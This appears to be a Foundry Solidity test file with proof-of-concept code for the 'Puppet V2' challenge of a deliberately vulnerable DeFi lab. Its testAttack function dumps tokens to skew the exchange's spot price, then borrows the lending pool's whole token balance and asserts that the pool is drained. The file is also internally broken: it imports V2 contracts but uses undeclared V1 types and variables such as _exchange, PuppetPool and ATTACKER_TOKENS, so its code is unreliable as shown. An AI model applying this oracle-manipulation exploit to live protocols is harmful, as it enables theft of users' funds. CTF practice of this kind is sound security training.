// SPDX-License-Identifier: MIT

pragma solidity 0.6.6;

import {Test, console} from "forge-std/Test.sol";

import "../src/PuppetV2Pool.sol";
import "./Deployer.sol";

contract StateLogger {
    function _logState(
        string memory username,
        address user,
        address pool,
        address exchange,
        DamnValuableToken token
    ) internal view {
        console.log(
            "%s eth/token: %d, %d",
            username,
            user.balance,
            token.balanceOf(user)
        );
        console.log(
            "Pool eth/token: %d, %d",
            address(pool).balance,
            token.balanceOf(address(pool))
        );
        console.log(
            "Exchange eth/token: %d, %d",
            address(exchange).balance,
            token.balanceOf(address(exchange))
        );
    }
}

contract ProofsOfConcept is Test, StateLogger {
    address _user = makeAddr("user");
    address _attacker = makeAddr("attacker");

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    uint256 public constant UNISWAP_INITIAL_TOKEN_RESERVE = 100 ether;
    uint256 public constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    uint256 public constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether;
    uint256 public constant PLAYER_INITIAL_ETH_BALANCE = 20 ether;

    uint256 public constant POOL_INITIAL_TOKEN_BALANCE = 1000000 ether;

    Deployer _deployer;
    PuppetV2Pool _pool;

    DamnValuableToken _token;
    UniswapV2Factory _factory;
    UniswapV2Router02 _router;
    UniswapV2Pair _pair;

    constructor() public {
        vm.deal(_user, PLAYER_INITIAL_ETH_BALANCE);

        _deployer = new Deployer();
        (_token, _pool, _exchange) = _deployer.deploy(
            UNISWAP_INITIAL_TOKEN_RESERVE,
            UNISWAP_INITIAL_WETH_RESERVE,
            POOL_INITIAL_TOKEN_BALANCE
        );

        console.log("Deployer address: %s", address(_deployer));
        console.log("Token address: %s", address(_token));
        console.log("Pool address: %s", address(_pool));
        console.log("Exchange address: %s", address(_exchange));
        console.log("This address: %s", address(this));
        console.log("constructor.msg.sender: %s", address(msg.sender));

        assertEq(
            _exchange.getTokenToEthInputPrice(1 ether),
            _calculateTokenToEthInputPrice(1 ether, 10 ether, 10 ether)
        );
    }

    function testHappyPath() external {
        _logState("_user", _user, address(_pool), address(_exchange), _token);

        vm.deal(_user, 1000 ether);
        vm.startPrank(_user);

        console.log("~ Borrow 90_000 tokens ~");
        uint256 tokensToBorrow = 90_000;
        _pool.borrow{value: tokensToBorrow * 2}(tokensToBorrow, _user);

        _logState("_user", _user, address(_pool), address(_exchange), _token);

        console.log("~ Swap Eth to token ~");
        _exchange.ethToTokenSwapInput{value: 1 ether}(
            1,
            block.timestamp + 1 hours
        );

        _logState("_user", _user, address(_pool), address(_exchange), _token);

        console.log("~ Swap token to Eth ~");
        _token.approve(address(_exchange), 1 ether);
        _exchange.tokenToEthSwapInput(0.01 ether, 1, block.timestamp + 1 hours);

        _logState("_user", _user, address(_pool), address(_exchange), _token);
    }

    function testHappyPathContract() external {
        vm.deal(_user, 1000 ether);
        vm.startPrank(_user);
        _logState("_user", _user, address(_pool), address(_exchange), _token);

        HappyPathContract happyPath = new HappyPathContract(
            _token,
            _pool,
            _exchange
        );
        _token.approve(address(happyPath), type(uint256).max);

        console.log("~ Send 1000 ether to HappyPathContract ~");
        happyPath.act{value: 1000 ether}();

        _logState("_user", _user, address(_pool), address(_exchange), _token);
    }

    function testAttack() external {
        vm.deal(_attacker, ATTACKER_ETH);
        _deployer.transfer(address(_attacker), ATTACKER_TOKENS);

        uint256 initialPoolTokenBalance = _deployer
            .POOL_INITIAL_TOKEN_BALANCE();

        _logState(
            "_attacker",
            _attacker,
            address(_pool),
            address(_exchange),
            _token
        );

        vm.startPrank(_attacker);

        console.log("~ Swap token to eth ~");
        _token.approve(address(_exchange), ATTACKER_TOKENS);
        _exchange.tokenToEthSwapInput(
            ATTACKER_TOKENS,
            // @audit-info min-eth needs to be > 0
            1, // min eth
            block.timestamp + 1 hours
        );

        _logState(
            "_attacker",
            _attacker,
            address(_pool),
            address(_exchange),
            _token
        );

        console.log("~ Borrow all tokens from pool ~");
        _pool.borrow{value: _attacker.balance}(
            initialPoolTokenBalance,
            _attacker
        );

        _logState(
            "_attacker",
            _attacker,
            address(_pool),
            address(_exchange),
            _token
        );

        console.log("~ Swap eth to token ~");
        _exchange.ethToTokenSwapInput{value: _attacker.balance}(
            1, // min token
            block.timestamp + 1 hours
        );

        _logState(
            "_attacker",
            _attacker,
            address(_pool),
            address(_exchange),
            _token
        );

        assertGt(_token.balanceOf(address(_attacker)), initialPoolTokenBalance);
        assertEq(_token.balanceOf(address(_pool)), 0);
    }

    // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
    function _calculateTokenToEthInputPrice(
        uint256 tokensSold,
        uint256 tokensInReserve,
        uint256 etherInReserve
    ) internal pure returns (uint256) {
        return
            (tokensSold * 997 * etherInReserve) /
            (tokensInReserve * 1000 + tokensSold * 997);
    }

    receive() external payable {}
}

contract HappyPathContract is Test, StateLogger {
    DamnValuableToken _token;
    PuppetPool _pool;
    UniswapV1Exchange _exchange;

    constructor(
        DamnValuableToken token,
        PuppetPool pool,
        UniswapV1Exchange exchange
    ) public {
        _token = token;
        _pool = pool;
        _exchange = exchange;
    }

    function act() external payable {
        _logState(
            "HappyPathContract",
            address(this),
            address(_pool),
            address(_exchange),
            _token
        );

        console.log("~ Borrow 90_000 tokens ~");
        uint256 tokensToBorrow = 90_000;
        _pool.borrow{value: tokensToBorrow * 2}(tokensToBorrow, address(this));

        _logState(
            "HappyPathContract",
            address(this),
            address(_pool),
            address(_exchange),
            _token
        );

        console.log("~ Swap eth to Token ~");
        _exchange.ethToTokenSwapInput{value: 1 ether}(
            1,
            block.timestamp + 1 hours
        );

        _logState(
            "HappyPathContract",
            address(this),
            address(_pool),
            address(_exchange),
            _token
        );

        console.log("~ Swap token to Eth ~");
        _token.approve(address(_exchange), 1 ether);
        _exchange.tokenToEthSwapInput(0.01 ether, 1, block.timestamp + 1 hours);

        _logState(
            "HappyPathContract",
            address(this),
            address(_pool),
            address(_exchange),
            _token
        );

        console.log("~ Transfer all tokens and eth to msg.sender ~");
        _token.transfer(msg.sender, _token.balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);

        _logState(
            "HappyPathContract",
            address(this),
            address(_pool),
            address(_exchange),
            _token
        );
    }

    receive() external payable {}
}
